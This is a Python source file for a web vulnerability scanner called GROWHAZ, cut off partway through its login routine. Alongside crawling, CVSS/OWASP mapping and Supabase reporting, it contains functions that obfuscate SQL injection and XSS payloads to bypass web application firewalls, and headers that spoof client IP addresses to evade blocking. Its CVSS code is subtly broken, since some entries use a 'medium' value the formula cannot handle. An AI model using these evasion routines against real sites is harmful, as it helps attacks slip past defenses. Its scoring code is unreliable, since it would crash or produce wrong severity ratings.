#!/usr/bin/env python3
"""
GROWHAZ Professional Security Testing Tool v5.0
- Deep site mapping with JavaScript crawling (Playwright) for React/Next.js/Angular
- Stealth mode: header rotation, IP spoofing, adaptive throttling
- Advanced payload obfuscation for SQLi/XSS to bypass WAFs
- Circuit breaker – stops testing endpoints after repeated blocks
- Uses actual discovered parameters (no blind guessing)
- Multithreaded testing with smart throttling
- High‑fidelity evidence (raw requests/responses, unique test ID, timestamps)
- CVSS v3.1 scoring and OWASP Top 10 mapping (CVSS calculation fixed)
- Detailed test status in final report (pass/fail/blocked/error)
- NEW: Enhanced SSRF detection (including out‑of‑band)
- NEW: Command Injection with time‑based & out‑of‑band
- NEW: JWT attacks (none algorithm, algorithm confusion, signature bypass)
- NEW: GraphQL security (introspection, query depth, batching)
- NEW: Race conditions (concurrent requests with analysis)
- NEW: Business logic flaws (price manipulation, negative quantities, etc.)
- NEW: File upload vulnerabilities (multiple bypass techniques)
- NEW: Rate limiting bypass (header manipulation)
- NEW: Prototype pollution (client‑side and server‑side)
- Supabase integration with specific report ID
- Always returns exit code 0 for GitHub Actions

For educational purposes only. Use only on authorized systems.
"""

import requests
import json
import sys
import time
import re
import datetime
import ssl
import socket
import os
import random
import uuid
import concurrent.futures
import hashlib
import jwt
import base64
from urllib.parse import urljoin, urlparse, quote, parse_qs
from bs4 import BeautifulSoup
from cryptography import x509
from cryptography.hazmat.backends import default_backend
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import ipaddress
import dns.resolver  # for DNS callback checks (optional)
import subprocess

# Optional Playwright import
try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

# ----------------------------------------------------------------------
# CVSS Scoring Helper (FIXED)
# ----------------------------------------------------------------------
def calculate_cvss_base(vuln_type, attack_vector="network", attack_complexity="low",
                        privileges_required="none", user_interaction="none", scope="unchanged",
                        confidentiality="high", integrity="high", availability="none"):
    """
    CVSS v3.1 base score calculator. Fixed the scope comparison bug.
    """
    # Metric values to numbers mapping (CVSS v3.1)
    av = {"network": 0.85, "adjacent": 0.62, "local": 0.55, "physical": 0.2}
    ac = {"low": 0.77, "high": 0.44}
    pr = {"none": 0.85, "low": 0.62, "high": 0.27}
    ui = {"none": 0.85, "required": 0.62}
    s = {"unchanged": 6.42, "changed": 7.52}  # impact sub-formula constants
    c = {"none": 0, "low": 0.22, "high": 0.56}
    i = {"none": 0, "low": 0.22, "high": 0.56}
    a = {"none": 0, "low": 0.22, "high": 0.56}

    # Impact sub-score (ISS)
    iss = 1 - ((1 - c[confidentiality]) * (1 - i[integrity]) * (1 - a[availability]))
    # Impact
    impact = s[scope] * iss
    # Exploitability
    exploitability = 8.22 * av[attack_vector] * ac[attack_complexity] * pr[privileges_required] * ui[user_interaction]
    # Base score
    if impact <= 0:
        base = 0
    else:
        # Fixed: compare the original scope string, not the numeric s[scope]
        if scope == "unchanged":
            base = min(impact + exploitability, 10)
        else:
            base = min(1.08 * (impact + exploitability), 10)
    return round(base, 1)

# Map vulnerability types to typical CVSS metrics
VULN_CVSS_MAP = {
    "SQL Injection": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "high",
        "integrity": "high",
        "availability": "none"
    },
    "Cross-Site Scripting (XSS)": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "required",
        "scope": "changed",
        "confidentiality": "low",
        "integrity": "low",
        "availability": "none"
    },
    "IDOR": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "low",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "high",
        "integrity": "none",
        "availability": "none"
    },
    "Directory Traversal": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "high",
        "integrity": "none",
        "availability": "none"
    },
    "CORS Misconfiguration": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "low",
        "integrity": "low",
        "availability": "none"
    },
    "Missing Rate Limiting": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "low",
        "integrity": "low",
        "availability": "low"
    },
    "Weak Password Policy": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "high",
        "integrity": "high",
        "availability": "high"
    },
    "User Enumeration": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "low",
        "integrity": "none",
        "availability": "none"
    },
    "Missing Security Header": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "none",
        "integrity": "none",
        "availability": "none"
    },
    "Server Version Disclosure": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "low",
        "integrity": "none",
        "availability": "none"
    },
    "Technology Disclosure": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "low",
        "integrity": "none",
        "availability": "none"
    },
    "Expired SSL Certificate": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "changed",
        "confidentiality": "low",
        "integrity": "low",
        "availability": "none"
    },
    "Weak SSL Cipher": {
        "attack_vector": "adjacent",
        "attack_complexity": "high",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "high",
        "integrity": "none",
        "availability": "none"
    },
    "Outdated TLS Version": {
        "attack_vector": "adjacent",
        "attack_complexity": "high",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "high",
        "integrity": "none",
        "availability": "none"
    },
    "CSRF / Missing Authentication": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "required",
        "scope": "unchanged",
        "confidentiality": "low",
        "integrity": "low",
        "availability": "none"
    },
    "Open Redirect": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "required",
        "scope": "unchanged",
        "confidentiality": "none",
        "integrity": "low",
        "availability": "none"
    },
    "Sensitive Data Exposure": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "high",
        "integrity": "none",
        "availability": "none"
    },
    # NEW VULNERABILITY TYPES
    "SSRF": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "changed",
        "confidentiality": "high",
        "integrity": "none",
        "availability": "none"
    },
    "Command Injection": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "high",
        "integrity": "high",
        "availability": "high"
    },
    "File Upload Vulnerability": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "changed",
        "confidentiality": "high",
        "integrity": "high",
        "availability": "high"
    },
    "JWT Weakness": {
        "attack_vector": "network",
        "attack_complexity": "high",
        "privileges_required": "low",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "high",
        "integrity": "high",
        "availability": "none"
    },
    "Prototype Pollution": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "changed",
        "confidentiality": "low",
        "integrity": "low",
        "availability": "low"
    },
    "Business Logic Flaw": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "low",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "medium",
        "integrity": "medium",
        "availability": "none"
    },
    "GraphQL Introspection": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "high",
        "integrity": "none",
        "availability": "none"
    },
    "Race Condition": {
        "attack_vector": "network",
        "attack_complexity": "high",
        "privileges_required": "low",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "medium",
        "integrity": "medium",
        "availability": "none"
    }
}

OWASP_MAP = {
    "SQL Injection": "A03:2021 – Injection",
    "Cross-Site Scripting (XSS)": "A03:2021 – Injection",
    "IDOR": "A01:2021 – Broken Access Control",
    "Directory Traversal": "A01:2021 – Broken Access Control",
    "CORS Misconfiguration": "A05:2021 – Security Misconfiguration",
    "Missing Rate Limiting": "A04:2021 – Insecure Design",
    "Weak Password Policy": "A07:2021 – Identification and Authentication Failures",
    "User Enumeration": "A07:2021 – Identification and Authentication Failures",
    "Missing Security Header": "A05:2021 – Security Misconfiguration",
    "Server Version Disclosure": "A05:2021 – Security Misconfiguration",
    "Technology Disclosure": "A05:2021 – Security Misconfiguration",
    "Expired SSL Certificate": "A05:2021 – Security Misconfiguration",
    "Weak SSL Cipher": "A05:2021 – Security Misconfiguration",
    "Outdated TLS Version": "A05:2021 – Security Misconfiguration",
    "CSRF / Missing Authentication": "A07:2021 – Identification and Authentication Failures",
    "Open Redirect": "A08:2021 – Software and Data Integrity Failures",
    "Sensitive Data Exposure": "A02:2021 – Cryptographic Failures",
    # NEW OWASP MAPPINGS
    "SSRF": "A10:2021 – Server-Side Request Forgery",
    "Command Injection": "A03:2021 – Injection",
    "File Upload Vulnerability": "A05:2021 – Security Misconfiguration",
    "JWT Weakness": "A02:2021 – Cryptographic Failures",
    "Prototype Pollution": "A08:2021 – Software and Data Integrity Failures",
    "Business Logic Flaw": "A04:2021 – Insecure Design",
    "GraphQL Introspection": "A05:2021 – Security Misconfiguration",
    "Race Condition": "A04:2021 – Insecure Design"
}

# ----------------------------------------------------------------------
# Enhanced Payload Obfuscation
# ----------------------------------------------------------------------
def obfuscate_sql_payload(payload):
    """Advanced SQL payload obfuscation to bypass WAFs."""
    # Randomly insert comments between characters
    if random.choice([True, False]):
        payload = '/**/'.join(list(payload))
    # URL encode special characters
    if random.choice([True, False]):
        payload = quote(payload, safe='')
    # Mixed case for keywords
    keywords = ['or', 'and', 'select', 'union', 'where', 'from', 'order', 'by', 'group', 'having']
    for kw in keywords:
        if kw in payload.lower():
            replacement = ''.join(random.choice([c.upper(), c.lower()]) for c in kw)
            payload = re.sub(r'(?i)\b' + kw + r'\b', replacement, payload)
    # Add inline comments after keywords
    if random.choice([True, False]):
        payload = re.sub(r'(\b(?:or|and|select|union|where|from)\b)', r'\1/**/', payload, flags=re.I)
    # Hex encoding for strings
    if random.choice([True, False]) and "'" in payload:
        # Simple hex encoding for quotes
        payload = payload.replace("'", "0x27")
    return payload

def obfuscate_xss_payload(payload):
    """Advanced XSS payload obfuscation."""
    # Mixed case
    if random.choice([True, False]):
        payload = ''.join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c for c in payload)
    # URL encode some characters
    if random.choice([True, False]):
        payload = quote(payload, safe='')
    # HTML entity encoding
    if random.choice([True, False]):
        payload = payload.replace('<', '&lt;').replace('>', '&gt;')
    # Add random whitespace
    if random.choice([True, False]):
        payload = re.sub(r'(\w)', r'\1 ', payload)
    return payload

# ----------------------------------------------------------------------
# Stealth headers with more variations
# ----------------------------------------------------------------------
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
]

def random_ip():
    """Generate a random internal IP (for spoofing)."""
    return f"{random.randint(10, 172)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

def get_stealth_headers():
    """Return a dictionary of headers for WAF bypass with extra randomization."""
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'X-Forwarded-For': random_ip(),
        'X-Real-IP': random_ip(),
        'X-Originating-IP': random_ip(),
        'X-Remote-IP': random_ip(),
        'X-Remote-Addr': random_ip(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }
    # Sometimes add extra headers
    if random.choice([True, False]):
        headers['Cache-Control'] = 'no-cache'
    if random.choice([True, False]):
        headers['Pragma'] = 'no-cache'
    return headers

# ----------------------------------------------------------------------
# Main SecurityTester class (improved)
# ----------------------------------------------------------------------
class SecurityTester:
    def __init__(self, base_url, report_id=None, login_credential=None, login_password=None):
        self.base_url = base_url.rstrip('/')
        self.report_id = report_id or os.getenv('REPORT_ID')
        self.login_credential = login_credential  # Can be email or phone
        self.login_password = login_password
        self.session = requests.Session()
        self.results = []                     # List of found vulnerabilities
        self.test_summary = {}                 # Dict with per-test status and details
        self.auth_token = None
        self.discovered_endpoints = {}         # {url: {method: [params]}}
        self.baseline_times = {}                # {endpoint_key: avg_time}
        self.openapi_spec = None
        self.use_js = True if PLAYWRIGHT_AVAILABLE else False   # Use JS if available
        self.supabase_url = os.getenv('SUPABASE_URL')
        self.supabase_key = os.getenv('SUPABASE_KEY')
        self.test_run_id = str(uuid.uuid4())   # unique ID for this run
        self.block_counter = {}                  # Circuit breaker tracking
        self.concurrent_requests = 20           # For race conditions
        self.callback_url = os.getenv('CALLBACK_URL')  # For out-of-band detection (SSRF, Command Injection)
        
        # Print configuration for debugging
        self.log(f"Initialized scanner for {base_url}")
        self.log(f"Report ID: {self.report_id}")
        self.log(f"Test Run ID: {self.test_run_id}")
        self.log(f"Supabase URL configured: {'Yes' if self.supabase_url else 'No'}")
        self.log(f"Login credentials provided: {'Yes' if self.login_credential else 'No'}")
        self.log(f"Playwright available: {PLAYWRIGHT_AVAILABLE} (JS crawling: {'enabled' if self.use_js else 'disabled'})")
        if self.callback_url:
            self.log(f"Out-of-band callback URL: {self.callback_url}")

    # ----------------------------------------------------------------------
    # Helper methods
    # ----------------------------------------------------------------------
    def log(self, message, status="INFO"):
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{status}] {message}")

    def _throttle(self):
        """Randomized Gaussian delay between 1.5 and 4.0 seconds, with extra jitter."""
        delay = random.gauss(2.75, 0.8)
        delay = max(1.5, min(4.0, delay))
        # Add random jitter
        delay += random.uniform(-0.3, 0.3)
        time.sleep(delay)

    def _request(self, method, url, **kwargs):
        """
        Wrapper for requests with stealth headers, throttling, and evidence capture.
        Also captures request details for evidence if needed.
        """
        self._throttle()
        headers = get_stealth_headers()
        # Merge with any existing session headers (like auth)
        session_headers = self.session.headers
        headers.update(session_headers)
        if 'headers' in kwargs:
            headers.update(kwargs['headers'])
        kwargs['headers'] = headers

        # Prepare request info for logging
        req_info = {
            'method': method.upper(),
            'url': url,
            'headers': dict(headers),
            'body': kwargs.get('json') or kwargs.get('data') or kwargs.get('params') or None,
            'timestamp': datetime.datetime.now().isoformat()
        }

        try:
            start_time = time.time()
            resp = self.session.request(method, url, **kwargs)
            elapsed = time.time() - start_time
            # Attach request info and timing to response for later use
            resp._request_info = req_info
            resp._elapsed = elapsed
            return resp
        except Exception as e:
            self.log(f"Request error: {e}", "ERROR")
            # Return a dummy response with error info for evidence
            dummy = requests.Response()
            dummy.status_code = 0
            dummy._request_info = req_info
            dummy._error = str(e)
            return dummy

    def calculate_risk_level(self):
        """Calculate risk level based on vulnerabilities found"""
        if not self.results:
            return "low"
        
        # Count critical vulnerabilities (CVSS >= 7.0)
        critical_count = sum(1 for v in self.results if v.get('cvss_score', 0) >= 7.0)
        
        if critical_count > 0:
            return "high"
        elif len(self.results) > 3:
            return "medium"
        else:
            return "low"

    def save_report(self):
        """Save report locally and upload to Supabase"""
        risk_level = self.calculate_risk_level()
        
        report = {
            "base_url": self.base_url,
            "test_run_id": self.test_run_id,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "vulnerabilities": self.results,
            "test_summary": self.test_summary,
            "summary": {
                "total_vulnerabilities": len(self.results),
                "risk_level": risk_level,
                "scan_completed": True,
                "blocked_tests": sum(1 for v in self.results if v.get('blocked', False))
            }
        }
        
        # Save JSON report
        try:
            with open("security_report.json", "w") as f:
                json.dump(report, f, indent=2)
            self.log("✅ Detailed report saved to 'security_report.json'")
        except Exception as e:
            self.log(f"❌ Error saving report: {e}", "ERROR")
        
        # Upload to Supabase with report_id
        self.send_report_to_supabase(report, risk_level)
        
        # Generate Markdown report for GitHub Actions
        self.save_markdown_report(risk_level)

    def save_markdown_report(self, risk_level):
        """Generate a markdown report for GitHub Actions"""
        try:
            with open("security_report.md", "w") as f:
                f.write("# 🔐 Security Test Report\n\n")
                f.write(f"**Target URL:** {self.base_url}\n\n")
                f.write(f"**Timestamp:** {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"**Report ID:** {self.report_id}\n")
                f.write(f"**Test Run ID:** {self.test_run_id}\n\n")
                
                # Summary section
                f.write("## 📊 Summary\n\n")
                f.write(f"- **Total Vulnerabilities:** {len(self.results)}\n")
                f.write(f"- **Risk Level:** {risk_level.upper()}\n\n")
                
                # Test summary table
                f.write("## 🧪 Test Results\n\n")
                f.write("| Test | Status | Details |\n")
                f.write("|------|--------|--------|\n")
                for test_name, status_info in self.test_summary.items():
                    status = status_info.get('status', 'UNKNOWN')
                    details = status_info.get('details', '')
                    emoji = "❌" if status == "VULNERABLE" else "✅" if status == "SECURE" else "🚧" if status == "BLOCKED" else "⚠️" if status == "ERROR" else "⏭️"
                    f.write(f"| {test_name} | {emoji} {status} | {details} |\n")
                f.write("\n")
                
                # Vulnerabilities section
                if self.results:
                    f.write("## 🚨 Vulnerabilities Found\n\n")
                    for i, vuln in enumerate(self.results, 1):
                        vuln_type = vuln.get('vulnerability', 'Unknown')
                        f.write(f"### {i}. {vuln_type}\n")
                        
                        # Create a table for vulnerability details
                        f.write("| Field | Value |\n")
                        f.write("|-------|-------|\n")
                        
                        for key, value in vuln.items():
                            if key != 'vulnerability':
                                # Format the value for better readability
                                if isinstance(value, dict) or isinstance(value, list):
                                    value = json.dumps(value, indent=2)
                                f.write(f"| {key} | `{value}` |\n")
                        f.write("\n")
                else:
                    f.write("## ✅ No Vulnerabilities Found\n\n")
                    f.write("Great! No security issues were detected during this scan.\n\n")
                
                # Footer
                f.write("---\n")
                f.write("*Report generated by GROWHAZ Professional Security Scanner v5.0*\n")
            
            self.log("✅ Markdown report saved to 'security_report.md'")
        except Exception as e:
            self.log(f"❌ Error saving markdown report: {e}", "ERROR")

    def send_report_to_supabase(self, report, risk_level):
        """Upload the report to Supabase using the specific report ID."""
        if not self.supabase_url or not self.supabase_key:
            self.log("⚠️ Supabase credentials not found. Skipping upload.", "WARNING")
            return
        
        if not self.report_id:
            self.log("⚠️ Report ID not found. Cannot update specific report.", "WARNING")
            self.log("Available env vars: REPORT_ID=" + os.getenv('REPORT_ID', 'not set'))
            return

        endpoint = f"{self.supabase_url}/rest/v1/security_reports?id=eq.{self.report_id}"
        headers = {
            "apikey": self.supabase_key,
            "Authorization": f"Bearer {self.supabase_key}",
            "Content-Type": "application/json",
            "Prefer": "return=representation"
        }
        
        vuln_counts = {}
        for vuln in self.results:
            vuln_type = vuln.get('vulnerability', 'Unknown')
            vuln_counts[vuln_type] = vuln_counts.get(vuln_type, 0) + 1
        
        data = {
            "report_data": report,
            "report_status": "completed",
            "vulnerabilities_found": len(self.results),
            "risk_level": risk_level,
            "scanned_at": datetime.datetime.now().isoformat()
        }
        
        try:
            self.log(f"📤 Uploading report to Supabase (ID: {self.report_id})...")
            r = requests.patch(endpoint, headers=headers, json=data)
            
            if r.status_code in [200, 204]:
                self.log(f"✅ Report updated successfully in Supabase!")
                self.log(f"   - Vulnerabilities found: {len(self.results)}")
                self.log(f"   - Risk level: {risk_level}")
                
                if vuln_counts:
                    self.log("   - Breakdown:")
                    for v_type, count in vuln_counts.items():
                        self.log(f"     • {v_type}: {count}")
            else:
                self.log(f"❌ Failed to update Supabase: {r.status_code}", "ERROR")
                self.log(f"Response: {r.text[:200]}")
                
        except Exception as e:
            self.log(f"❌ Error uploading report to Supabase: {e}", "ERROR")

    # ----------------------------------------------------------------------
    # WAF / blocking detection (improved)
    # ----------------------------------------------------------------------
    def is_blocked(self, response):
        """Check if the request was blocked by a firewall or bot‑protection."""
        if hasattr(response, '_error') and response._error:
            return False  # Request error, not necessarily a block

        if response.status_code in [403, 406, 429]:
            return True

        waf_signatures = ['cloudflare', 'akamai', 'datadome', 'incapsula', 'aws-waf', 'cloudfront', 'f5']
        server_header = response.headers.get('Server', '').lower()
        if any(waf in server_header for waf in waf_signatures) and response.status_code >= 400:
            return True

        html_content = response.text.lower()
        block_keywords = [
            'captcha', 'access denied', 'please verify you are a human',
            'security challenge', 'robot', 'blocked', 'rate limit exceeded',
            'waf', 'firewall', 'ddos', 'security check', 'bot protection'
        ]
        if any(keyword in html_content for keyword in block_keywords):
            return True

        return False

    # ----------------------------------------------------------------------
    # Baseline measurement (uses _request for stealth)
    # ----------------------------------------------------------------------
    def measure_baseline(self, endpoint, method='GET', params=None, data=None, json_data=None, samples=3):
        """Send normal requests to the endpoint and return average response time."""
        key = f"{method}:{endpoint}"
        if params:
            key += f":{sorted(params.items())}"
        if data:
            key += f":{sorted(data.items())}"
        if json_data:
            key += f":{sorted(json_data.items())}"

        if key in self.baseline_times:
            return self.baseline_times[key]

        times = []
        for _ in range(samples):
            try:
                start = time.time()
                if method.upper() == 'GET':
                    self._request('GET', endpoint, params=params, timeout=3)
                elif method.upper() == 'POST':
                    if json_data:
                        self._request('POST', endpoint, json=json_data, timeout=3)
                    else:
                        self._request('POST', endpoint, data=data, timeout=3)
                elapsed = time.time() - start
                times.append(elapsed)
            except Exception:
                pass
            time.sleep(0.2)

        avg_time = sum(times) / len(times) if times else 1.0
        self.baseline_times[key] = avg_time
        return avg_time

    # ----------------------------------------------------------------------
    # Enhanced crawling for modern JS frameworks
    # ----------------------------------------------------------------------
    def crawl_static(self, start_url=None, max_pages=100):
        self.log("🕷️ Starting static web crawler (no JavaScript)...")
        to_visit = [start_url or self.base_url]
        visited = set()
        forms_found = []
        endpoints_found = set()

        # Common API paths to probe
        api_paths = ['/api', '/api/v1', '/api/v2', '/graphql', '/rest', '/swagger', '/openapi.json', '/v1', '/v2']

        while to_visit and len(visited) < max_pages:
            url = to_visit.pop(0)
            if url in visited:
                continue
            visited.add(url)

            try:
                response = self._request('GET', url, timeout=3)
                if 'text/html' not in response.headers.get('Content-Type', ''):
                    continue

                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find forms
                for form in soup.find_all('form'):
                    action = form.get('action')
                    if action:
                        full_action = urljoin(url, action)
                        method = form.get('method', 'get').upper()
                        inputs = [inp.get('name') for inp in form.find_all(['input', 'textarea', 'select']) if inp.get('name')]
                        forms_found.append({'url': full_action, 'method': method, 'inputs': inputs})
                        endpoints_found.add(full_action)
                        if full_action not in self.discovered_endpoints:
                            self.discovered_endpoints[full_action] = {}
                        if method not in self.discovered_endpoints[full_action]:
                            self.discovered_endpoints[full_action][method] = set()
                        self.discovered_endpoints[full_action][method].update(inputs)

                # Find links
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    full_url = urljoin(url, href)
                    if full_url.startswith(self.base_url) and full_url not in visited and full_url not in to_visit:
                        to_visit.append(full_url)
                        endpoints_found.add(full_url)

                # Extract script tags for potential API endpoints
                for script in soup.find_all('script', src=True):
                    src = script['src']
                    full_src = urljoin(url, src)
                    if full_src.startswith(self.base_url) and full_src not in endpoints_found:
                        endpoints_found.add(full_src)
                        
                # Also add potential API endpoints from links
                parsed = urlparse(url)
                for path in api_paths:
                    api_url = f"{parsed.scheme}://{parsed.netloc}{path}"
                    if api_url not in visited and api_url not in to_visit:
                        to_visit.append(api_url)
                        
            except Exception as e:
                self.log(f"Error crawling {url}: {e}", "ERROR")

        self.log(f"✅ Static crawling finished. Discovered {len(endpoints_found)} endpoints, {len(forms_found)} forms.")
        return forms_found

    def crawl_with_playwright(self, start_url=None, max_pages=100):
        if not PLAYWRIGHT_AVAILABLE:
            self.log("⚠️ Playwright not installed. Falling back to static crawler.", "WARNING")
            return self.crawl_static(start_url, max_pages)

        self.log("🕷️ Starting JavaScript‑enabled crawler with Playwright (supports React/Next.js/Angular)...")
        forms_found = []
        visited = set()
        to_visit = [start_url or self.base_url]
        endpoints_found = set()

        api_paths = ['/api', '/api/v1', '/api/v2', '/graphql', '/rest', '/swagger', '/openapi.json', '/v1', '/v2']

        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                page = browser.new_page()

                # Capture all network requests to find API endpoints
                requests_seen = set()
                def handle_request(request):
                    if request.url.startswith(self.base_url) and request.url not in requests_seen:
                        requests_seen.add(request.url)
                        endpoints_found.add(request.url)
                        # Also try to parse as potential endpoint
                        parsed = urlparse(request.url)
                        path = parsed.path
                        if path and path not in self.discovered_endpoints:
                            self.discovered_endpoints[path] = {'GET': set()}  # assume GET for now
                page.on('request', handle_request)

                while to_visit and len(visited) < max_pages:
                    url = to_visit.pop(0)
                    if url in visited:
                        continue
                    visited.add(url)

                    try:
                        page.goto(url, wait_until='networkidle', timeout=10000)
                        html = page.content()
                        soup = BeautifulSoup(html, 'html.parser')

                        # Find forms
                        for form in soup.find_all('form'):
                            action = form.get('action')
                            if action:
                                full_action = urljoin(url, action)
                                method = form.get('method', 'get').upper()
                                inputs = [inp.get('name') for inp in form.find_all(['input', 'textarea', 'select']) if inp.get('name')]
                                forms_found.append({'url': full_action, 'method': method, 'inputs': inputs})
                                endpoints_found.add(full_action)
                                if full_action not in self.discovered_endpoints:
                                    self.discovered_endpoints[full_action] = {}
                                if method not in self.discovered_endpoints[full_action]:
                                    self.discovered_endpoints[full_action][method] = set()
                                self.discovered_endpoints[full_action][method].update(inputs)

                        # Find links
                        for link in soup.find_all('a', href=True):
                            href = link['href']
                            full_url = urljoin(url, href)
                            if full_url.startswith(self.base_url) and full_url not in visited and full_url not in to_visit:
                                to_visit.append(full_url)
                                endpoints_found.add(full_url)

                        # Find script tags
                        for script in soup.find_all('script', src=True):
                            src = script['src']
                            full_src = urljoin(url, src)
                            if full_src.startswith(self.base_url) and full_src not in endpoints_found:
                                endpoints_found.add(full_src)

                        # Also look for JSON data in script tags (e.g., Next.js props)
                        for script in soup.find_all('script', type='application/json'):
                            try:
                                data = json.loads(script.string)
                                # Recursively search for URLs
                                def extract_urls(obj):
                                    if isinstance(obj, str) and obj.startswith(self.base_url):
                                        endpoints_found.add(obj)
                                    elif isinstance(obj, dict):
                                        for v in obj.values():
                                            extract_urls(v)
                                    elif isinstance(obj, list):
                                        for item in obj:
                                            extract_urls(item)
                                extract_urls(data)
                            except:
                                pass

                    except Exception as e:
                        self.log(f"Error crawling {url} with Playwright: {e}", "ERROR")

                # After crawling, add API paths to to_visit if not already visited
                parsed = urlparse(self.base_url)
                for path in api_paths:
                    api_url = f"{parsed.scheme}://{parsed.netloc}{path}"
                    if api_url not in visited:
                        endpoints_found.add(api_url)
                        # Optionally visit it to parse any HTML response (if any)
                        to_visit.append(api_url)

                browser.close()
        except Exception as e:
            self.log(f"❌ Playwright error: {e}", "ERROR")
            return self.crawl_static(start_url, max_pages)

        self.log(f"✅ JavaScript crawling finished. Discovered {len(endpoints_found)} endpoints, {len(forms_found)} forms.")
        return forms_found

    def discover_endpoints(self):
        """Discover endpoints through crawling and OpenAPI"""
        self.log("🔍 Discovering endpoints...")
        
        if self.use_js:
            self.crawl_with_playwright(max_pages=100)
        else:
            self.crawl_static(max_pages=100)
            
        self.log(f"✅ Total endpoints discovered: {len(self.discovered_endpoints)}")

    # ----------------------------------------------------------------------
    # Login attempt with email/phone support
    # ----------------------------------------------------------------------
    def attempt_login(self):
        """Attempt to login using provided credentials (email or phone)"""
        if not self.login_credential or not self.login_password:
            self.log("🔑 No login credentials provided, skipping authentication...")
            return False
            
        self.log(f"🔑 Attempting login with credential: {self.login_credential}...")
        
        # Determine if credential is email or phone
        is_email = '@' in self.login_credential
        is_phone = any(c.isdigit() for c in self.login_credential) and len(self.login_credential) >= 10
        
        login_urls = [
